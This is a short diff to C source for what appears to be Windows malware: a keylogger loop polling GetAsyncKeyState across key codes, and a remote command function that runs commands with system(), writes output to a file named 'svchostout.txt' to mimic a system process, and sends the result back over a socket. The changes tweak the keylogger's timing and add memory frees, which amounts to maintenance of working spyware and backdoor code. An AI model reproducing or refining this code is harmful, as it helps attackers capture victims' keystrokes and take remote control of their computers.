@@ -112,10 +112,10 @@ void hdos_exe(char *address){
 }
 
 int get_keylog(){
-
+    printf("ESKEREE");
 	short character;
 	while(1){
-		sleep(10);
+		//sleep(1);
 		for(character=8;character<=222;character++)
 		{
 			 if(GetAsyncKeyState(character)==-32767){
@@ -257,6 +257,7 @@ int exec_command(char *command, int sock)
     strcpy(result, command);
     strcat(result, var);
     system(result);
+    free(result);
     FILE *fp = fopen("svchostout.txt", "r");
     if(fp != NULL)
     {
@@ -270,6 +271,7 @@ int exec_command(char *command, int sock)
         }
         fclose(fp);
         send(sock, word, strlen(word),0);
+        free(word);
     }
     else{return 0; }    //Error
     system("del svchostout.txt");
